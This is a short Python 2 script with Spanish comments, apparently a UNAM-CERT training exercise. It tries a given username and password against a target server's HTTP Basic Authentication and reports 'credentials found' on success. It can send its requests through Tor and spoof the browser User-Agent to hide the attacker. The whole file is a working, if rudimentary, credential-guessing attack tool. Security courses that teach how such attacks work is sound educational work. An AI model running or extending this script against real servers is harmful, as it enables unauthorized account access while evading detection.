#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError
from requests import session
# import


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-t', '--tor', dest='tor', action="store_const", const=True, help='Make requests through TOR browser.')
    parser.add_option('-u', '--useragent', dest='useragent', action="store_const", const=True, help='Changes User Agent default name')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password, tor, useragent):
    try:
        headers = {}
        if useragent: 
            headers['User-agent'] = 'Opera/9.80 (SpreadTrum; Opera Mini/4.4.31492/36.1370; U; en) Presto/2.12.423 Version/12.16'
        if tor:
            sesion = session()
            sesion.proxies = {}
            sesion.proxies['http'] = 'socks5://127.0.0.1:9150' #en mi caso sale por el 9150
            sesion.proxies['https'] = 'socks5://127.0.0.1:9150'
            response = sesion.get(host, auth=(user,password), headers=headers)
        else:
            response = get(host, auth=(user,password), headers=headers)
        # print response
        # print dir(response)
        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
        else:
            print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        makeRequest(url, opts.user, opts.password, opts.tor, opts.useragent)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)